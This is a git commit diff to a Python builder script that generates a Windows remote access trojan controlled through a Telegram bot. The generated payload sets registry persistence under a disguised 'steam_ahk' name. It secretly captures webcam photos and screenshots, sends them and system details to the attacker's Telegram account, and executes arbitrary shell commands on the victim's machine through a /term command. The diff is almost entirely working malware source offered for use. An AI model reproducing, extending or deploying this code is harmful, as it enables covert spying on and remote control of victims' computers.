e8d37350af1d3bf56170e9ba422394fede67517e
sudoreboot <55040629+kotik06@users.noreply.github.com>
2021-09-18 17:31:42 +0700

    v1

--- go.py
+++ go.py
@@ -1,17 +1,16 @@
 # -*- coding: utf-8 -*- 
-import colorama
 import random
 
 
 banners = [
-'''\033[33m
+"""\033[33m
                          __   _____  __    __    __ _   
                         / _\  \_   \/ /   /__\/\ \ \ |_ 
                         \ \    / /\/ /   /_\ /  \/ / __|
                         _\ \/\/ /_/ /___//__/ /\  /| |_ 
                         \__/\____/\____/\__/\_\ \/  \__|
                                                         
-                                by kotik06                           \033[39m''',
+                                by kotik06                           \033[39m""",
 """
 \033[31m
                    SSSSS  IIIII LL      EEEEEEE NN   NN tt    
@@ -50,26 +49,44 @@ r"""
 def main():
 	
 	print(random.choice(banners))
-	print("Version 0.2(beta)")
 	tk=str(input("Telegram bot api token: "))
 	proc=str(input("Process name (no file extension): "))
-	#print("Admin id :");admin=int(input())
+	admin=int(input("Telegram user id:"))
 	auto=str(input("Path to autoload (C:\\Program Files\\Oracle\\ ) :"))
+    
 	if auto == '' or auto == ' ':
-		auto='C:\\Program Files\\Oracle\\'
+		auto=r"C:\\Program Files\\Oracle\\"
 	py=proc+'.py'
 	exe=proc+'.exe'
 	f = open (py,'w')
-	f.write(r"""
+	f.write("""import os
 import time
-import cv2# CODE BY SUDOREBOOT2020
-import telebot
-import os
+import cv2# CODE BY SUDOREBOOT
+from aiogram import Bot, types
+from aiogram.dispatcher import Dispatcher
+from aiogram.utils import executor
+import pyautogui as p
+ADMIN="""+str(admin)+"""
+TOKEN = '"""+str(tk)+"""'
+bot = Bot(token=TOKEN)
+dp = Dispatcher(bot)
+
+def reestr():
+
+	# Путь в реестре
+	key_my = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
+
+	# Установить скрипт в автозагрузку
+	SetValueEx(key_my, 'steam_ahk', 0, REG_SZ, r'"""+str(auto)+str(exe)+"""')
+
+	# Закрыть реестр
+	CloseKey(key_my)	
+
 def camera():
 	
 	# Включаем первую камеру
 	cap = cv2.VideoCapture(0)
-	name='cam1.png'
+	name='.cam.png'
 	# "Прогреваем" камеру, чтобы снимок не был тёмным
 	for i in range(30):
 		cap.read()
@@ -80,69 +97,92 @@ def camera():
 	# Отключаем камеру
 	cap.release()
 
-def reestr():
+@dp.message_handler(commands=['start', 'help'])
+async def send_welcome(msg: types.Message):
+    if msg.from_user["id"] == ADMIN:
+        ms=f'''
+{msg.from_user["first_name"]}, welcome
+Command list:\n/cam - send webcam photo
+/screen -  will send you the user\'s screen
+/info - get PC info
+/term - send terminal command(syntax: /term command1 command2)'''
+        
+        await msg.answer(ms)
+    else:
+        await msg.answer("You don't have access")
 
-	# Путь в реестре
-	key_my = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
-
-	# Установить скрипт в автозагрузку
-	SetValueEx(key_my, '_steam', 0, REG_SZ, r'"""+str(auto)+str(exe)+"""')
-
-	# Закрыть реестр
-	CloseKey(key_my)
-def screen():
-	name='screen1.png'
-	im = p.screenshot(name)
-
-
-
-def otpravka():
-	bot = telebot.TeleBot('"""+str(tk)+"""')
-
-	# Тут работаем с командой start
-	@bot.message_handler(commands=['start'])
-	def welcome_start(message):
-		bot.send_message(message.chat.id, '''Hello user for screenshoot say : /screen\nfor photo : /cam''')
-
-	@bot.message_handler(commands=['screen'])
-	def welcome_start(message):
-		screen()
-		syss=os.name
-		syss_2=os.getlogin() 
-		ooo='sys:'+str(syss)+' user:'+str(syss_2)+' screen:'
-		bot.send_message(message.chat.id,ooo)
-		#file = open('cam1.png', 'rb')
-		file_2=open('screen1.png', 'rb')
-		bot.send_photo(message.chat.id, file_2)
-	@bot.message_handler(commands=['cam'])
-	def welcome_start(message):
-		camera()	
-		syss=os.name
-		syss_2=os.getlogin() 
-		ooo='sys:'+str(syss)+' user:'+str(syss_2)+' camera photo:'	
-		bot.send_message(message.chat.id, ooo)
-		file = open('cam1.png', 'rb')
-		#file_2=open('screen1.png', 'rb')
-		bot.send_photo(message.chat.id, file)
+@dp.message_handler(commands=['screen'])
+async def send_photo(msg: types.Message):
+    
+    im = p.screenshot('.screen.png')
+    if msg.from_user["id"] == ADMIN:
+        
+        #await msg.reply_to_message(msg.text)
+        
+        #photo = InputFile(".screen.png")
+        
+        await bot.send_photo(chat_id=ADMIN, photo=open('.screen.png','rb'))
+        
+        os.remove('.screen.png')
+    else:
+        await msg.answer("You don't have access")
 
 
-	bot.polling()
+@dp.message_handler(commands=['cam'])
+async def send_photo(msg: types.Message):
+    camera()
+    
+    if msg.from_user["id"] == ADMIN:
+    
+        # print(msg.from_user)
+        #await msg.reply_to_message(msg.text)
+        #await msg.answer(f'{msg.from_user["first_name"]}, с возвращением')
+        #photo = InputFile(".screen.png")
+        
+        await bot.send_photo(chat_id=ADMIN, photo=open('.cam.png','rb'))
+        os.remove('.cam.png')
+    else:
+        await msg.answer("You don't have access")
+@dp.message_handler(commands=['info'])
+async def send_info(msg: types.Message):
+    if msg.from_user["id"] == ADMIN:
+        info=os.uname()
+        #await msg.reply_to_message(msg.text)
+      
+        await msg.answer(f'''os.name:{info.sysname}
+nodename:{info.nodename}
+release:{info.release}
+machine:{info.machine}
+version:{info.version}''')
+        
+        #await bot.send_photo(chat_id=ADMIN, photo=open('.screen.png','rb'))
+        
+        #os.remove('.screen.png')
+    else:
+        await msg.answer("You don't have access")
 
-def main():
-	
-	reestr()
-	otpravka()
-	time.sleep(1)
+
+
+
+#@dp.message_handler(content_types=['text'])
+@dp.message_handler(commands=['term'])
+async def term(msg: types.Message):
+    if msg.from_user["id"] == ADMIN:
+        
+        command = msg['text'].split()
+        del(command[0])
+        command=' '.join(map(str, command))
+        os.system(command)
+       # print(command)
+        #os.system(f"{msg.text()}")
+        await msg.answer("Done")
+    else:
+        await msg.answer("You don't have access")
 if __name__ == '__main__':
-	while 1:
-		main()
+    reestr()    
+    executor.start_polling(dp)
 
-
-
-
-
-
-		""")
+""")
 	f.close()
 	print('DONE')
 	print("Use pyinstaller for make .exe file ")
